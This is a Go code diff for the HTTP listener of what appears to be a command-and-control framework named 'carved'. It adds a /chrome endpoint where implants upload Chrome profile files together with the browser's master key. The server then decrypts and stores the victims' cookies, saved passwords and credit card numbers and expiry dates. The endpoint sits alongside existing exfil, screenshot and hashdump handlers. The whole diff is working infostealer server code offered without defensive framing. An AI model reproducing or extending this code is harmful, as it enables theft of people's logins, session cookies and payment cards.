@@ -1,6 +1,7 @@
 package listeners
 
 import (
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -13,6 +14,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/carved4/carved/server/pkg/chrome"
 	"github.com/carved4/carved/server/pkg/db"
 	"github.com/carved4/carved/shared/crypto"
 	"github.com/carved4/carved/shared/proto"
@@ -66,6 +68,7 @@ func (m *Manager) Start(l *db.Listener) error {
 	hl.mux.HandleFunc("/upload", hl.handleUpload)
 	hl.mux.HandleFunc("/screenshot", hl.handleScreenshot)
 	hl.mux.HandleFunc("/exfil", hl.handleExfil)
+	hl.mux.HandleFunc("/chrome", hl.handleChromeUpload)
 	hl.mux.HandleFunc("/implant", hl.handleImplant)
 
 	hl.mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
@@ -268,9 +271,9 @@ func (hl *HTTPListener) handleBeacon(w http.ResponseWriter, r *http.Request) {
 			if err == nil && task != nil {
 				if task.Type == proto.TaskHashdump {
 					parseHashdumpCredentials(beacon.ImplantID, string(result.Output))
-				} else if task.Type == proto.TaskChrome {
-					parseChromeCredentials(beacon.ImplantID, result.Output)
 				}
+				// Chrome data is now handled via /chrome handler, result.Output is just a status string.
+
 			}
 		}
 	}
@@ -757,6 +760,143 @@ func (hl *HTTPListener) handleExfil(w http.ResponseWriter, r *http.Request) {
 	fmt.Printf("[+] received exfil from %s: %s (%d bytes)\n", r.RemoteAddr, filename, written)
 
 	w.Header().Set("Content-Type", "text/plain")
+	w.WriteHeader(http.StatusOK)
+	w.Write([]byte("ok"))
+}
+func (hl *HTTPListener) handleChromeUpload(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	implantID := r.Header.Get("X-Implant-ID")
+	if implantID == "" {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+
+	// Parse multipart form
+	if err := r.ParseMultipartForm(32 << 20); err != nil {
+		fmt.Printf("[!] failed to parse chrome multipart: %v\n", err)
+		http.Error(w, "bad request", http.StatusBadRequest)
+		return
+	}
+
+	keyHex := r.FormValue("key")
+	if keyHex == "" {
+		http.Error(w, "missing key", http.StatusBadRequest)
+		return
+	}
+	masterKey, err := hex.DecodeString(keyHex)
+	if err != nil {
+		fmt.Printf("[!] invalid master key hex: %v\n", err)
+		http.Error(w, "invalid key", http.StatusBadRequest)
+		return
+	}
+
+	files := r.MultipartForm.File["files"]
+	if len(files) == 0 {
+		http.Error(w, "no files", http.StatusBadRequest)
+		return
+	}
+
+	tmpDir, err := os.MkdirTemp("", "chrome_upload_*")
+	if err != nil {
+		fmt.Printf("[!] failed to create temp dir: %v\n", err)
+		http.Error(w, "internal error", http.StatusInternalServerError)
+		return
+	}
+	defer os.RemoveAll(tmpDir)
+
+	extractedCount := 0
+
+	for _, fileHeader := range files {
+		src, err := fileHeader.Open()
+		if err != nil {
+			fmt.Printf("[!] failed to open uploaded file: %v\n", err)
+			continue
+		}
+
+		tmpPath := filepath.Join(tmpDir, fileHeader.Filename)
+		dst, err := os.Create(tmpPath)
+		if err != nil {
+			src.Close()
+			fmt.Printf("[!] failed to create temp file: %v\n", err)
+			continue
+		}
+
+		_, err = io.Copy(dst, src)
+		src.Close()
+		dst.Close()
+
+		if err != nil {
+			fmt.Printf("[!] failed to save temp file: %v\n", err)
+			continue
+		}
+		profile := "Default"
+		parts := strings.Split(fileHeader.Filename, "_chrome_")
+		if len(parts) == 2 {
+			profile = parts[0]
+		}
+
+		cookies := chrome.ExtractCookies(masterKey, tmpPath, profile)
+		for _, c := range cookies {
+			cred := &db.Credential{
+				ImplantID: implantID,
+				Source:    "chrome/cookies",
+				Domain:    c.Host,
+				Username:  c.Name,
+				Secret:    c.Value,
+				Type:      "cookie",
+				Created:   time.Now(),
+			}
+			if err := db.SaveCredential(cred); err == nil {
+				extractedCount++
+			}
+		}
+
+		passwords := chrome.ExtractPasswords(masterKey, tmpPath, profile)
+		for _, p := range passwords {
+			if p.Username == "" && p.Password == "" {
+				continue
+			}
+			cred := &db.Credential{
+				ImplantID: implantID,
+				Source:    "chrome/logins",
+				Domain:    p.URL,
+				Username:  p.Username,
+				Secret:    p.Password,
+				Type:      "password",
+				Created:   time.Now(),
+			}
+			if err := db.SaveCredential(cred); err == nil {
+				extractedCount++
+			}
+		}
+
+		cards := chrome.ExtractCards(masterKey, tmpPath, profile)
+		for _, c := range cards {
+			secret := fmt.Sprintf("Exp:%s|Num:%s", c.Expiration, c.Number)
+			cred := &db.Credential{
+				ImplantID: implantID,
+				Source:    "chrome/cards",
+				Domain:    c.NameOnCard,
+				Username:  "CC",
+				Secret:    secret,
+				Type:      "credit_card",
+				Created:   time.Now(),
+			}
+			if err := db.SaveCredential(cred); err == nil {
+				extractedCount++
+			}
+		}
+	}
+
+	if extractedCount > 0 {
+		fmt.Printf("[+] extracted %d credentials from %s uploaded chrome data\n", extractedCount, implantID[:8])
+	} else {
+		fmt.Printf("[*] received chrome data from %s but extracted nothing (maybe only empty/unknown files)\n", implantID[:8])
+	}
+
 	w.WriteHeader(http.StatusOK)
 	w.Write([]byte("ok"))
 }
